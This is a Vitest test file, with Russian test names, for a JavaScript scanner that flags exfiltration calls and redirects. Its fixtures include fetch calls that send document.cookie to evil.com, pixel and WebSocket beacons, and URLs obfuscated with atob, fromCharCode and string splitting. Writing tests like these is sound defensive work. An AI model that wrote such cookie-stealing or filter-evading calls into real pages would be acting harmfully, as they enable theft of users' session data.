import { describe, it, expect } from 'vitest';
import { parseJs } from '../../ast/parse.js';
import { detectExfilCalls } from '../detect-exfil-calls.js';
import { detectRedirect } from '../detect-redirect.js';
import type { DetectorContext } from '../../ast/types.js';

const MAIN = 'mysite.com';
const ctx = (source: string): DetectorContext => ({ source, relPath: 't.js', mainHost: MAIN });

const exfil = (src: string, threat: string): boolean => {
  const ast = parseJs(src, 't.js')!;
  return detectExfilCalls(ast, ctx(src)).some((r) => r.threatType === threat);
};
const redirect = (src: string): boolean => {
  const ast = parseJs(src, 't.js')!;
  return detectRedirect(ast, ctx(src)).some((r) => r.threatType === 'redirect');
};

describe('DET-1 — вычисляемый URL: конкатенация/template литералов резолвится', () => {
  it('fetch со склейкой схемы по кускам ("htt"+"ps://evil")', () => {
    expect(exfil(`fetch('htt' + 'ps://evil.com/x')`, 'exfil-fetch')).toBe(true);
  });
  it('fetch с template-литералом (https://evil/${p})', () => {
    expect(exfil('fetch(`https://evil.com/${path}`)', 'exfil-fetch')).toBe(true);
  });
  it('fetch с литеральным внешним префиксом + переменная (cookie-exfil)', () => {
    expect(exfil(`fetch('https://evil.com/?c=' + document.cookie)`, 'exfil-fetch')).toBe(true);
  });
  it('new Image().src со склейкой', () => {
    expect(exfil(`new Image().src = 'htt' + 'ps://evil.com/p.gif'`, 'exfil-pixel')).toBe(true);
  });
  it('new WebSocket со склейкой', () => {
    expect(exfil(`new WebSocket('ws' + 's://evil.com/s')`, 'exfil-websocket')).toBe(true);
  });
});

describe('DET-1 — обфусцированный декодер в URL (atob/unescape/fromCharCode)', () => {
  it('fetch(atob(...)) → подозрительно', () => {
    expect(exfil(`fetch(atob('aHR0cHM6Ly9ldmlsLmNvbS94'))`, 'exfil-fetch')).toBe(true);
  });
  it('fetch(unescape(...)) → подозрительно', () => {
    expect(exfil(`fetch(unescape('%68%74%74%70'))`, 'exfil-fetch')).toBe(true);
  });
  it('fetch(String.fromCharCode(...)) → подозрительно', () => {
    expect(exfil(`fetch(String.fromCharCode(104,116,116,112))`, 'exfil-fetch')).toBe(true);
  });
  it('window.atob в составе аргумента тоже ловится', () => {
    expect(exfil(`fetch(window.atob('eA==') + '/p')`, 'exfil-fetch')).toBe(true);
  });
});

describe('DET-1 — РОБАСТНОСТЬ: легитимные вычисляемые URL НЕ флагуются', () => {
  it('fetch(apiBase + "/users/" + id) — переменная-база, путь относительный', () => {
    expect(exfil(`fetch(apiBase + '/users/' + id)`, 'exfil-fetch')).toBe(false);
  });
  it('fetch("/api/" + endpoint) — относительный путь', () => {
    expect(exfil(`fetch('/api/' + endpoint)`, 'exfil-fetch')).toBe(false);
  });
  it('fetch(someUrl) — голая переменная (не шуметь)', () => {
    expect(exfil(`fetch(someUrl)`, 'exfil-fetch')).toBe(false);
  });
  it('fetch("https://api.mysite.com/" + id) — свой хост (поддомен mainHost)', () => {
    expect(exfil(`fetch('https://api.mysite.com/' + id)`, 'exfil-fetch')).toBe(false);
  });
  it('decodeURIComponent НЕ считается обфускацией (легитимный декод query)', () => {
    expect(exfil(`fetch('/x?p=' + decodeURIComponent(q))`, 'exfil-fetch')).toBe(false);
  });
  it('btoa (кодер исходящих данных) сам по себе не флагует относительный URL', () => {
    expect(exfil(`fetch('/track?d=' + btoa(payload))`, 'exfil-fetch')).toBe(false);
  });
});

describe('DET-1 — НЕ-регресс: литеральные формы по-прежнему ловятся', () => {
  it('литеральный внешний fetch', () => {
    expect(exfil(`fetch('https://evil.com/x')`, 'exfil-fetch')).toBe(true);
  });
});

describe('DET-1 — редирект: вычисляемый URL', () => {
  it('location.href со склейкой схемы', () => {
    expect(redirect(`location.href = 'htt' + 'ps://evil.com'`)).toBe(true);
  });
  it('location.href = atob(...) — обфусцированный редирект', () => {
    expect(redirect(`location.href = atob('aHR0cHM6Ly9ldmls')`)).toBe(true);
  });
  it('location.replace("//"+"evil/go") — протокол-относительный по кускам', () => {
    expect(redirect(`location.replace('//' + 'evil.com/go')`)).toBe(true);
  });

  it('РОБАСТНОСТЬ: location.href = "/local" (резолвится в относительный) НЕ флагуется', () => {
    expect(redirect(`location.href = '/loc' + 'al/page'`)).toBe(false);
  });
  it('РОБАСТНОСТЬ: location.href = nextPage (голая переменная) НЕ флагуется', () => {
    expect(redirect(`location.href = nextPage`)).toBe(false);
  });
  it('НЕ-регресс: литеральный внешний редирект по-прежнему ловится', () => {
    expect(redirect(`location.href = 'https://evil.com'`)).toBe(true);
  });
});
